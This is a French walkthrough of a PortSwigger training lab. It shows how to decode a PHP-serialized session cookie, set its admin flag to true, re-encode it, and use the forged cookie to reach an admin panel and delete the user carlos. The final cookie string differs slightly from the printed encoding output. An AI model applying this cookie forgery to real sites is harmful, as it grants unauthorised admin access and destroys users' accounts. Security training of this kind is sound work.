# Lab

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects

## Solution

Ce lab possède un objet PHP sérialisé dans les cookies quand on se connecte : `Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`

La chaine de caractères est encodée en base64, on peut la décoder :

```bash
$ echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=" | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

On peut voir que l'objet est de type `User` et qu'il possède deux attributs : `username` et `admin`.

On va donc essayer de modifier la valeur de l'attribut `admin` à `1` pour devenir admin.

```bash
$ echo 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}' | base64
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7Yjox
O30K
```

Et on l'insère dans le cookie : `Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30k`

Ce qui nous donne accès à l'endpoint `/admin` et à la fonctionnalié de suppression de compte.

On doit maintenant faire un appel à l'endpoint `/admin/delete?username=carlos` avec le cookie modifié pour supprimer le compte de Carlos.